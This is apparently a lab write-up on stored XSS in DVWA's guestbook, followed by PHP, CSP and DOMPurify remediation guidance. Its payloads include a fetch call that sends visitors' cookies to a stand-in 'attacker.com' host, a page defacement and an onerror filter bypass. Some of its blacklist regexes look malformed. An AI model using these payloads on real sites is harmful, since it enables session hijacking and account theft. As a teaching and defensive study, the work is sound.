# Stored XSS Vulnerability Analysis

## 📋 Overview
Stored (Persistent) XSS occurs when malicious input is saved to the database and executed every time users view the infected page. This is more dangerous than Reflected XSS because it affects all users, not just one victim.

**Vulnerability Type:** CWE-79  
**OWASP Category:** A03:2021 - Injection  
**Severity:** CRITICAL (CVSS 8.8)

## 🔍 Discovery Process

**Location:** DVWA Guestbook feature  
**Input Fields:** Name (50 char limit), Message (unlimited)  
**Storage:** MySQL database table `guestbook`

**Test Input:**
- Name: `Daniel`
- Message: `Hello`

**Result:** Entry stored and displayed on page reload

## 🎯 Successful Exploitation

### 1. Persistent Alert Box
**Name Field:**
html
<script>alert('Stored XSS')</script>

**Result:** ✅ Alert executes on every page load for all users

### 2. Session Cookie Theft
**Name Field:**
html
<script>alert(document.cookie)</script>

**Result:** ✅ Displays session cookie to all visitors  
**Impact:** Every user's cookie exposed

### 3. Page Defacement
**Name Field:**
html
<script>document.body.innerHTML='<h1>HACKED</h1>'</script>

**Result:** ✅ Entire page content replaced  
**Impact:** Persistent until database cleaned

### 4. External Data Exfiltration (Proof of Concept)
**Name Field:**
html
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>

**Result:** Would send all visitors' cookies to attacker  
**Impact:** Mass credential theft

## 🛡️ Impact Assessment

**Severity: CRITICAL**

### Why Stored XSS is Worse Than Reflected

| Aspect | Reflected XSS | Stored XSS |
|--------|---------------|------------|
| Persistence | No | Yes |
| Victims | One (requires click) | All (automatic) |
| Severity | Medium-High | Critical |
| Detectability | Easier | Harder |
| Remediation | Easier | Requires database cleanup |

### Real-World Attack Scenario


1. Attacker posts malicious comment on forum
2. Comment contains: <script>/* cookie stealer */</script>
3. Malicious code saved to database
4. Every user who views the page executes the script
5. All sessions compromised without user interaction
6. Attacker gains access to multiple accounts


### Famous Stored XSS Attacks
- **2005 Samy Worm (MySpace):** Infected 1 million users in 20 hours
- **2014 TweetDeck:** XSS worm spread via retweets
- **2018 British Airways:** XSS led to 380,000 customer data theft

## 🔒 Remediation Strategies

### 1. Output Encoding (Essential)

**Vulnerable Code:**
php
<?php
$stmt = $db->prepare("SELECT name, message FROM guestbook");
$stmt->execute();

while ($row = $stmt->fetch()) {
    echo $row['name'] . ': ' . $row['message'];  // DANGEROUS!
}
?>


**Secure Code:**
php
<?php
$stmt = $db->prepare("SELECT name, message FROM guestbook");
$stmt->execute();

while ($row = $stmt->fetch()) {
    // Encode EVERYTHING from database before displaying
    echo htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8') . ': ';
    echo htmlspecialchars($row['message'], ENT_QUOTES, 'UTF-8');
}
?>


### 2. Input Validation + Output Encoding

**Defense in Depth:**
php
<?php
// Validate input BEFORE storing
$name = $_POST['name'];
$message = $_POST['message'];

// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $name)) {
    die("Name: Only letters, numbers, spaces allowed");
}

if (strlen($name) > 50 || strlen($message) > 500) {
    die("Input too long");
}

// Store in database (still vulnerable if not encoded on output!)
$stmt = $db->prepare("INSERT INTO guestbook (name, message) VALUES (?, ?)");
$stmt->execute([$name, $message]);

// CRITICAL: Encode when displaying
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>


### 3. Content Security Policy (CSP)

**Block All Inline JavaScript:**

Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'


**Implementation:**
php
<?php
// Generate random nonce for each page load
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-$nonce'");
?>

<!-- Only scripts with matching nonce will execute -->
<script nonce="<?php echo $nonce; ?>">
  // Legitimate script
  console.log('This is allowed');
</script>

<!-- Stored XSS without nonce won't execute -->
<script>alert('XSS')</script> <!-- BLOCKED -->


### 4. DOMPurify for Rich Text

**If You Need to Allow Some HTML:**
javascript
// Use DOMPurify library to sanitize HTML
const dirty = userInput;
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
});
document.getElementById('content').innerHTML = clean;


### 5. Database-Level Protection

**Stored Procedures with Validation:**
sql
DELIMITER $$

CREATE PROCEDURE AddGuestbookEntry(
    IN p_name VARCHAR(50),
    IN p_message VARCHAR(500)
)
BEGIN
    -- Server-side validation
    IF p_name REGEXP '[<>"]' THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = 'Invalid characters in name';
    END IF;
    
    INSERT INTO guestbook (name, message, created_at)
    VALUES (p_name, p_message, NOW());
END$$

DELIMITER ;


### 6. Regular Expression Blacklist (Additional Layer)

**Block Common XSS Patterns:**
php
<?php
function contains_xss($input) {
    $dangerous_patterns = [
        '/<script\b[^>]>.?<\/script>/is',
        '/<iframe\b[^>]>.?<\/iframe>/is',
        '/on\w+\s*=\s*[\'"]?[^\'">\s]+/is',  // Event handlers
        '/javascript:/is',
        '/<object\b[^>]>.?<\/object>/is'
    ];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $input)) {
            return true;
        }
    }
    return false;
}

if (contains_xss($_POST['name']) || contains_xss($_POST['message'])) {
    die("Potential XSS detected");
}
?>


**Warning:** Blacklists are NOT sufficient alone - always encode output!

## 🧪 Testing on Higher Security Levels

### Medium Security
**Protection:** Basic `<script>` tag stripping  
**Bypass:** Use event handlers instead
html
<img src=x onerror=alert('XSS')>


### High Security
**Protection:** More comprehensive filtering + output encoding  
**Result:** Harder to exploit but not impossible

### Impossible Security
**Protection:** Full output encoding with `htmlspecialchars()`  
**Result:** ✅ Secure against XSS

## 🎯 Key Takeaways

1. ✅ **Stored XSS is CRITICAL** - Affects all users automatically
2. ✅ **Always encode database output** - Never trust stored data
3. ✅ **Defense in depth** - Validate input AND encode output
4. ✅ **Use CSP** - Blocks XSS even if encoding missed
5. ✅ **Regular security audits** - Scan for malicious stored content
6. ✅ **User privileges** - Limit who can post content
7. ✅ **Content moderation** - Review user-generated content

## 📚 Learning Resources

- [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)
- [PortSwigger Stored XSS Labs](https://portswigger.net/web-security/cross-site-scripting/stored)
- [Content Security Policy Guide](https://content-security-policy.com/)

---

**Tested By:** Daniel Oyanogbezina  
**Date:** December 14, 2025  
**DVWA Security Level:** Low  
**Status:** ✅ Successfully Exploited | 🛡️ Remediation Documented
